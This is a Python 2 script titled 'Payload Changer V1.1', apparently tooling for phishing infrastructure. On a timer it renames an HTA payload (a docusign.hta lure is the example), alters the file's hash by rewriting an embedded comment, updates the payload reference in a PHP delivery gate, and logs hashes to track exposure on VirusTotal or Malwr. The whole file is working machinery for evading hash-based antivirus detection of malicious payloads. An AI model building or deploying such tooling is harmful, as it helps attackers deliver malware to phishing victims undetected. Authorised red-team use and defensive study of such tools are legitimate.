#!/usr/bin/python
import sys
import os
import commands
import argparse
import random
import datetime
import time

print '''
--------------------------------Payload Changer V1.1---------------------------------------------------
                                (-h) for help
            Reminder: Put this script somewhere not readable on the web server
NOTE: When you launch this, make sure your php gate has the "placeholder" string!!!!
    Normal use:  Put this in /var/www/ and then the gate and payload in /var/www/html
                        Send bugs and ideas to sam @ sayen.io
--------------------------------------------------------------------------------------------------------
'''

parser = argparse.ArgumentParser(description='Changes your hta payload name and hash at a time interval, along with the reference in id_ip_gate.php')
parser.add_argument('-d', '--directory', help="Absolute path to the directory with your payload and and php gate. Put in the ending slash. (ex: /var/www/html/", required=True)
parser.add_argument('-p', '--payload', help="Name of initial payload. ex: docusign.hta", required=True)
parser.add_argument('-g', '--gatename', help="Name of php gate. (Recommended you use id_ip_gate.php from git, but change the name..) Assumes the payload inside the gate is initially set to the default value of PAYLOADCHANGEME.hta", required=True)
parser.add_argument('-s', '--sleepinterval', help="Number of seconds to sleep in between changing the payload name and hash. Default is 60 seconds", required=True)
args = parser.parse_args()
directory = args.directory
payload = args.payload
payloadpath = directory + payload
gatename = args.gatename
gatenamepath = directory + gatename
sleepinterval = args.sleepinterval


def changer():
    rando = random.randint(1,10000000)
    rando = str(rando)
    randoname = rando + "_" + payload
    return randoname


def main():
    print "[+] Payload name: %s" %(payloadpath)
    print "[+] PHP gate file which will have the payload set to change on the timer: %s" %(gatenamepath)
    print "[+] Sleep interval: %s seconds" %(sleepinterval)
    sleepintervalint = int(sleepinterval)
    oldrandonamereturnpath = payloadpath
    oldrandocomment = "initialized"
    oldrandonamereturn = "placeholder"

# Beginning of endless loop to change the payload hash, name, and reference in the gate php file
    while True:
        time.sleep(sleepintervalint)
        randonamereturn = changer()
        randonamereturnpath = directory + randonamereturn
        os.rename(oldrandonamereturnpath,randonamereturnpath)
        print "File has been changed from %s to: %s" %(oldrandonamereturnpath, randonamereturnpath)
        datestamp = datetime.datetime.now().strftime("%I:%M%p on %B %d, %Y")
        randocomment = "<!-- " + randonamereturn + " : " + datestamp + " --!>"  


# Replaces the name and timestamp string for the newly renamed payload.  
# This servest to change the hash and allows you to easily determine info on the file and trace backwards in the access.log if you find it on VirusTotal or Malwr

        if oldrandocomment == "initialized":
            with open(randonamereturnpath, 'a') as myfile:
                myfile.write(randocomment)
        else:
            with open(randonamereturnpath) as myfile:
                newText=myfile.read().replace(oldrandocomment, randocomment)
            with open(randonamereturnpath, "w") as myfile:
                myfile.write(newText)

# Replacing the payload reference inside your gate PHP file

        with open(gatenamepath) as myfile:
            newText=myfile.read().replace(oldrandonamereturn, randonamereturn)
        with open(gatenamepath, "w") as myfile:
            myfile.write(newText)

# Compute the new sha256 hash for the payload

        cmd = "shasum -a 256 %s" %(randonamereturnpath)
        payloadhash = commands.getoutput(cmd)
        payloadhash = str(payloadhash)

# Write the hash to a payload_hashes.txt log file in the same directory      
        with open("payload_hashes.txt", "a") as myfile:
            myfile.write(payloadhash + '\n')

# Write the hash to a payload_hashes.txt log file in the same directory      
        with open("payload_names.txt", "a") as myfile:
            myfile.write(randonamereturn + '\n')
        
# Move the variables to backups before replacing in the next loop        
        oldrandonamereturnpath = randonamereturnpath
        oldrandonamereturn = randonamereturn
        oldrandocomment = randocomment

if __name__ == '__main__':
    main()